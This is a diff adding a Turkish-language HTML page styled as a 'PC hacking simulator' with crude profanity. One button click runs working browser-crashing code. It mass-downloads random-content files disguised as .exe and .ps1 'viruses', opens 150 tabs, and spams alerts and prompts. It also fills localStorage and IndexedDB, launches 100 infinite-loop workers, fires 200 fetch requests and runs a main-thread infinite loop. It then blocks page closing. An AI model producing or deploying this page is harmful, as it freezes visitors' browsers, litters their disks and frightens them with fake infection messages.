@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 PC KASMA SIMULATOR 2035 🔥</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Patlayan efektler */
+        .explosion {
+            position: fixed;
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle, rgba(255,0,0,0.8), rgba(255,100,0,0.4), transparent);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: boom 0.5s ease-out forwards;
+            z-index: 9999;
+        }
+
+        @keyframes boom {
+            0% { transform: scale(0); opacity: 1; }
+            100% { transform: scale(5); opacity: 0; }
+        }
+
+        /* Ana kart */
+        .card {
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 50px;
+            text-align: center;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 50px rgba(255,0,255,0.5);
+            z-index: 100;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px #ff00ff; }
+            100% { box-shadow: 0 0 60px #ff00ff; }
+        }
+
+        h1 {
+            font-size: 48px;
+            color: #ff00ff;
+            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
+            margin-bottom: 20px;
+            animation: glitch 0.3s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: skew(0deg, 0deg); }
+            33% { transform: skew(2deg, -1deg); text-shadow: -2px 0 red; }
+            66% { transform: skew(-2deg, 1deg); text-shadow: 2px 0 blue; }
+            100% { transform: skew(0deg, 0deg); }
+        }
+
+        .warning {
+            color: #ff4444;
+            font-size: 18px;
+            margin: 20px 0;
+            animation: blink 0.5s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        button {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            border: none;
+            padding: 20px 50px;
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: monospace;
+            text-transform: uppercase;
+            transition: 0.1s linear;
+            box-shadow: 0 0 20px rgba(255,0,0,0.8);
+            margin-top: 20px;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px red;
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        .counter {
+            color: #0f0;
+            font-size: 24px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        /* Uçan popuplar */
+        .popup {
+            position: fixed;
+            background: #ff00ff;
+            color: black;
+            padding: 10px 20px;
+            font-weight: bold;
+            border-radius: 10px;
+            font-size: 14px;
+            white-space: nowrap;
+            animation: fly 2s ease-out forwards;
+            z-index: 9998;
+            pointer-events: none;
+        }
+
+        @keyframes fly {
+            0% { transform: translate(0, 0) rotate(0deg); opacity: 1; }
+            100% { transform: translate(var(--dx), var(--dy)) rotate(360deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>💀 PC KASMA SIMULATOR 💀</h1>
+    <div class="warning">⚠️ UYARI: BU BUTONA BASMAK PC'NİZİ SİKER! ⚠️</div>
+    <button id="startBtn">🚀 BAŞLAT 🚀</button>
+    <div class="counter" id="counter">Hazır mısın?</div>
+</div>
+
+<script>
+    (function() {
+        // Ses context (BİPP boosted)
+        let audioCtx = null;
+        
+        function playBoostedBipp() {
+            try {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                audioCtx.resume().then(() => {
+                    const now = audioCtx.currentTime;
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.frequency.value = 880;
+                    gain.gain.value = 1;
+                    osc.start();
+                    gain.gain.exponentialRampToValueAtTime(0.00001, now + 0.3);
+                    osc.stop(now + 0.3);
+                    
+                    // Bass boosted ekstra
+                    const osc2 = audioCtx.createOscillator();
+                    const gain2 = audioCtx.createGain();
+                    osc2.connect(gain2);
+                    gain2.connect(audioCtx.destination);
+                    osc2.frequency.value = 220;
+                    gain2.gain.value = 0.7;
+                    osc2.start();
+                    gain2.gain.exponentialRampToValueAtTime(0.00001, now + 0.4);
+                    osc2.stop(now + 0.4);
+                });
+            } catch(e) { console.log("ses patladı"); }
+        }
+
+        // Rastgele dosya indirme (100 tane)
+        function downloadRandomFiles(count) {
+            const fileTypes = [
+                { ext: '.exe', mime: 'application/octet-stream', size: 1024*1024*5 },
+                { ext: '.bat', mime: 'text/plain', size: 1024*500 },
+                { ext: '.vbs', mime: 'text/plain', size: 1024*300 },
+                { ext: '.scr', mime: 'application/octet-stream', size: 1024*1024*2 },
+                { ext: '.dll', mime: 'application/octet-stream', size: 1024*1024 },
+                { ext: '.ps1', mime: 'text/plain', size: 1024*200 }
+            ];
+            
+            for(let i = 0; i < count; i++) {
+                const randType = fileTypes[Math.floor(Math.random() * fileTypes.length)];
+                const fileName = `virus_${Date.now()}_${Math.random().toString(36).substring(7)}${randType.ext}`;
+                const size = randType.size;
+                // Rastgele içerik
+                const content = new Uint8Array(size);
+                for(let j = 0; j < size; j++) {
+                    content[j] = Math.floor(Math.random() * 256);
+                }
+                const blob = new Blob([content], {type: randType.mime});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+        }
+
+        // Yeni sekme aç ve yönlendir
+        function openTabsAndRedirect(count) {
+            const urls = [
+                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",  // rickroll
+                "https://www.google.com",
+                "https://www.facebook.com",
+                "https://www.twitter.com",
+                "https://www.instagram.com",
+                "https://www.tiktok.com",
+                "https://www.reddit.com",
+                "https://www.amazon.com",
+                "https://www.netflix.com",
+                "https://www.spotify.com",
+                "https://www.microsoft.com",
+                "https://www.apple.com",
+                "https://www.wikipedia.org",
+                "https://www.yahoo.com",
+                "https://www.bing.com",
+                "https://www.twitch.tv",
+                "https://www.discord.com",
+                "https://www.roblox.com",
+                "https://www.steampowered.com",
+                "https://www.epicgames.com"
+            ];
+            
+            for(let i = 0; i < count; i++) {
+                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+                window.open(randomUrl, '_blank');
+            }
+        }
+
+        // Rastgele popup uçur
+        function createFlyingPopup(text) {
+            const popup = document.createElement('div');
+            popup.className = 'popup';
+            popup.innerText = text;
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            popup.style.left = x + 'px';
+            popup.style.top = y + 'px';
+            const dx = (Math.random() - 0.5) * 500;
+            const dy = (Math.random() - 0.5) * 500 - 200;
+            popup.style.setProperty('--dx', dx + 'px');
+            popup.style.setProperty('--dy', dy + 'px');
+            document.body.appendChild(popup);
+            setTimeout(() => popup.remove(), 2000);
+        }
+
+        // Patlama efekti
+        function createExplosion(x, y) {
+            const explosion = document.createElement('div');
+            explosion.className = 'explosion';
+            explosion.style.left = (x - 50) + 'px';
+            explosion.style.top = (y - 50) + 'px';
+            document.body.appendChild(explosion);
+            setTimeout(() => explosion.remove(), 500);
+        }
+
+        // Ekranı sallama
+        function shakeScreen() {
+            const intensity = 10;
+            let interval = setInterval(() => {
+                const x = (Math.random() - 0.5) * intensity;
+                const y = (Math.random() - 0.5) * intensity;
+                document.body.style.transform = `translate(${x}px, ${y}px)`;
+            }, 50);
+            setTimeout(() => {
+                clearInterval(interval);
+                document.body.style.transform = '';
+            }, 1000);
+        }
+
+        // Sonsuz alert spam (amaç pc kitleme)
+        function spamAlerts() {
+            for(let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    alert("💀 SİSTEM ÇÖKÜYOR 💀");
+                }, i * 100);
+            }
+        }
+
+        // Sonsuz prompt
+        function spamPrompts() {
+            for(let i = 0; i < 30; i++) {
+                setTimeout(() => {
+                    prompt("BİLGİSAYARINIZ SİKİLİYOR! 'tamam' yazın:");
+                }, i * 200);
+            }
+        }
+
+        // DOM'u şişirme (milyonlarca div)
+        function bloatDOM() {
+            for(let i = 0; i < 5000; i++) {
+                const div = document.createElement('div');
+                div.style.position = 'fixed';
+                div.style.width = '1px';
+                div.style.height = '1px';
+                div.style.backgroundColor = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+                div.style.left = Math.random() * 10000 + 'px';
+                div.style.top = Math.random() * 10000 + 'px';
+                document.body.appendChild(div);
+            }
+        }
+
+        // Sonsuz localStorage doldur
+        function fillLocalStorage() {
+            try {
+                for(let i = 0; i < 10000; i++) {
+                    localStorage.setItem(`key_${i}`, 'x'.repeat(1024 * 100)); // 100KB each
+                }
+            } catch(e) {}
+        }
+
+        // IndexedDB spam
+        function spamIndexedDB() {
+            const request = indexedDB.open("pckasmaDB", 1);
+            request.onupgradeneeded = function(e) {
+                const db = e.target.result;
+                db.createObjectStore("store");
+            };
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                const tx = db.transaction("store", "readwrite");
+                const store = tx.objectStore("store");
+                for(let i = 0; i < 5000; i++) {
+                    store.put(new Array(10000).fill(i).join(','), `id_${i}`);
+                }
+            };
+        }
+
+        // Web Worker spam
+        function spamWorkers() {
+            for(let i = 0; i < 100; i++) {
+                const blob = new Blob([`while(true){console.log('worker ${i}');}`], {type: 'application/javascript'});
+                const url = URL.createObjectURL(blob);
+                new Worker(url);
+            }
+        }
+
+        // Sonsuz fetch request
+        function spamFetch() {
+            for(let i = 0; i < 200; i++) {
+                fetch(`https://httpbin.org/delay/${Math.random()*5}`, {mode: 'no-cors'}).catch(e=>{});
+            }
+        }
+
+        // Mouse hareketinde patlama
+        let explosionInterval = null;
+        function startMouseExplosions() {
+            explosionInterval = setInterval(() => {
+                window.dispatchEvent(new Event('mousemove'));
+            }, 50);
+            document.addEventListener('mousemove', (e) => {
+                createExplosion(e.clientX, e.clientY);
+            });
+        }
+
+        // Ana yıkım fonksiyonu
+        function destroyPC() {
+            const counterDiv = document.getElementById('counter');
+            let step = 0;
+            const steps = [
+                "💣 SİSTEM İHLAL EDİLDİ 💣",
+                "🔥 PC SİKME BAŞLADI 🔥",
+                "📂 VİRÜSLER İNDİRİLİYOR... 📂",
+                "🌐 100+ SEKME AÇILIYOR... 🌐",
+                "💀 BİPP BOOSTED SES PATLATMASI 💀",
+                "⚠️ ALERT SPAM AKTİF ⚠️",
+                "💾 LOCALSTORAGE DOLDURULUYOR 💾",
+                "🌀 DOM ŞİŞİRİLİYOR 🌀",
+                "⚡ PC'NİZ ARTIK BİTTİ ⚡"
+            ];
+            
+            const interval = setInterval(() => {
+                if(step < steps.length) {
+                    counterDiv.innerText = steps[step];
+                    counterDiv.style.color = '#ff4444';
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    counterDiv.innerText = "💀 SİSTEM ÇÖKTÜ 💀";
+                }
+            }, 800);
+            
+            // 1. Ses patlat
+            playBoostedBipp();
+            setTimeout(() => playBoostedBipp(), 200);
+            setTimeout(() => playBoostedBipp(), 500);
+            
+            // 2. Dosya indirme (100+ dosya)
+            setTimeout(() => downloadRandomFiles(150), 300);
+            
+            // 3. Sekme açma (150 sekme)
+            setTimeout(() => openTabsAndRedirect(150), 500);
+            
+            // 4. Popup uçurma
+            let popupCount = 0;
+            const popupInterval = setInterval(() => {
+                createFlyingPopup("💀 PC SİKİLDİ 💀");
+                createFlyingPopup("🔞 VİRUS BULAŞTI 🔞");
+                createFlyingPopup("⚠️ SİSTEM ÇÖKÜYOR ⚠️");
+                popupCount++;
+                if(popupCount > 200) clearInterval(popupInterval);
+            }, 100);
+            
+            // 5. Ekran sallama
+            setTimeout(() => shakeScreen(), 1000);
+            setTimeout(() => shakeScreen(), 2000);
+            setTimeout(() => shakeScreen(), 3000);
+            
+            // 6. Alert spam
+            setTimeout(() => spamAlerts(), 1500);
+            
+            // 7. Prompt spam
+            setTimeout(() => spamPrompts(), 2500);
+            
+            // 8. DOM bloat
+            setTimeout(() => bloatDOM(), 800);
+            setTimeout(() => bloatDOM(), 2000);
+            
+            // 9. LocalStorage doldur
+            setTimeout(() => fillLocalStorage(), 1200);
+            
+            // 10. IndexedDB spam
+            setTimeout(() => spamIndexedDB(), 1800);
+            
+            // 11. Worker spam
+            setTimeout(() => spamWorkers(), 2200);
+            
+            // 12. Fetch spam
+            setTimeout(() => spamFetch(), 2800);
+            
+            // 13. Mouse patlamaları
+            setTimeout(() => startMouseExplosions(), 3500);
+            
+            // 14. Sonsuz loop (performans öldürücü)
+            setTimeout(() => {
+                while(true) {
+                    Math.random() * Math.random();
+                    new Array(10000).fill(0).map(x => x+1);
+                    if(performance.now() > 999999999999) break;
+                }
+            }, 4000);
+            
+            // 15. History spam (yönlendirme)
+            setTimeout(() => {
+                for(let i = 0; i < 500; i++) {
+                    history.pushState({}, '', `/?spam=${i}`);
+                }
+            }, 4500);
+        }
+        
+        // Butona basınca her şey başlasın
+        document.getElementById('startBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').innerText = '🔥 SİKİYOR... 🔥';
+            destroyPC();
+        });
+        
+        // Sayfa kapanmaya çalışırsa engelle
+        window.onbeforeunload = function() {
+            return "PC'niz şu anda sıkiliyor. Sayfayı kapatmak sisteme zarar verebilir!";
+        };
+    })();
+</script>
+</body>
+</html>
